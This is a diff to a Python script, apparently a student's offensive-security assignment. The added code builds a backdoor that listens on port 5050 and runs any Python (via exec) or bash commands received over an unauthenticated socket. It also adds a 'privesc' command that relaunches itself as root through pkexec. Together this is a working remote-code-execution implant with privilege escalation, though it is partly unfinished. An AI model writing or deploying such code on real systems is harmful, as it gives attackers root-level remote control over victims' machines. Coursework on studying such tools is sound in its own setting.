@@ -12,8 +12,8 @@ import subprocess
 import sys
 import time
 import os
-
-
+import contextlib
+import io
 
 THIS_FILE = os.path.realpath(__file__)
 
@@ -30,11 +30,21 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 # listen on port 5050, receive input
 HOST, PORT = "0.0.0.0", 5050
 
-
+def privesc():
+    # Check if we are not already root (UID 0)
+    if os.getuid() != 0:
+        print("Elevating to root...")
+        # Use Popen to launch the new privileged process without blocking
+        # "" recommends subprocess.Popen([sys.executable, THIS_FILE])
+        subprocess.Popen(["pkexec", sys.executable, THIS_FILE])
+        
+        # Exit this unprivileged instance so the new root one takes over
+        sys.exit(0)
+ 
 def kill_others():
     """
     Since a port can only be bound by one program, kill all other programs on this port that we can see.
-    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
+    This makes it so if we run our script multiple times, only the most up-to-date/privileged one will be running in the end
     """
     # check if privilege escalated
     # if os.geteuid() == 0:
@@ -78,6 +88,15 @@ def bootstrap_packages():
         # If you need pip install X packages, here, import them now
         import requests
 
+def handle_python_command(user_input):
+    buffer = io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buffer):
+            exec(user_input)
+        output = buffer.getvalue() #AI for capturing output
+        return output if output else "Success!"
+    except Exception as e:
+        return f"Error: {e}" 
 
 
 def handle_conn(conn, addr):
@@ -89,28 +108,44 @@ def handle_conn(conn, addr):
         # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
-        data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
-
-        if not data:
+        raw_data = conn.recv(1024)
+        if not raw_data:
             return
         
+        data = raw_data.decode("utf-8", errors="replace").strip()
+
+        print("received: " + data)
+
+        parts = data.split(" ", 1)
+        command_type = parts[0]
+        command_body = parts[1] if len(parts) > 1 else "" # AI for splitting
+
+        #stuff I added -- START
+        # Command 1: Privilege Escalation
+        if command_type == "privesc":
+            print("Running privesc")
+            privesc()
+
+        #Command 2: Python 
+        if command_type == "PY":
+            print("Running python")
+            handle_python_command(command_body)
+        
+        if command_type == "BASH":
+            run_command(command_body)
 
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
-
         try:
-            conn.sendall("Response data here".encode())
+            conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
 
-
 def main():
     kill_others()
     bootstrap_packages()
-
-
+    
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
@@ -124,7 +159,6 @@ def main():
                 raise
             except:
                 print("Connection died")
-
 
 if __name__ == "__main__":
     main()
